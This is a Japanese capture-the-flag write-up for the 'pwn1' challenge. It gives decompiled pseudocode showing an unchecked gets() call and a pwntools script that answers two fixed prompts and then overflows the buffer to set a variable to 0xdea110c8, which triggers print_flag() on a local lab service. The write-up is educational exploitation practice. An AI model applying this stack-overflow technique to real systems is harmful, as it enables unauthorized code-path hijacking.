# pwn1
## Description
実行ファイルが渡される。

## Solution
まずはgdbで実行しつつ内部構造を探った。  
そこで以下のことがわかった。
一回目の入力は"Sir Lancelot of Camelot\n"  
二回目の入力は"To seek the Holy Grail.\n"  
三回目の入力はgets()による入力で、入力した変数ではなく、  それより上位のアドレスの変数で比較していたので、  バッファーオーバーフローで目的の変数の値を0xdea110c8にすることで目的のprint_flag()を実行することが出来た。
### 疑似コード
```
main(char **argv){
    char var_3bh[0x2b];  // ebp-0x3b
    int32 var_10h;  // ebp-0x10
    int32 var_ch;   // ebp-0xc
    int32 var_8h;   // ebp-0x8
    
    setvbuf(eax,2,0,0)
    var_ch = 2
    var_10h = 0
    puts("Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.")
    puts("What... is your name?")
    fgets(stdin,var_3bh,0x2b)
    if (strcmp(var_3bh,"Sir Lancelot of Camelot\n")==0){
        print("What... is your quest")
        fgets(stdin,var_3bh,0x2b)
        if(strcmp(var_3bh,"To seek the Holy Grail.\n")  ==0){
            print("What... is my secret?")
            gets(var_3bh)
            if(var_10h == 0xdea110c8){
                print_flag()
            }else{
                print("I don't know that! Auuuuuuuugh!")
            }
        }else{
            print("I don't know that! Auuuuuuuugh!")
            exit(0)
        }
    }else{
        print("I don't know that! Auuuuuuuugh!")
        exit(0)
    }
    return(0)
}
```

### Solve_Code
```python:mysolve.py
from pwn import *
io = remote("localhost",4088)
io.recvuntil("name?")
io.sendline("Sir Lancelot of Camelot")
io.recvuntil("quest")
io.sendline("To seek the Holy Grail.")
io.recvuntil("secret?")
payload = b'A'*0x2b
payload += p32(0xdea110c8) 
io.sendline(payload)
io.interactive()
```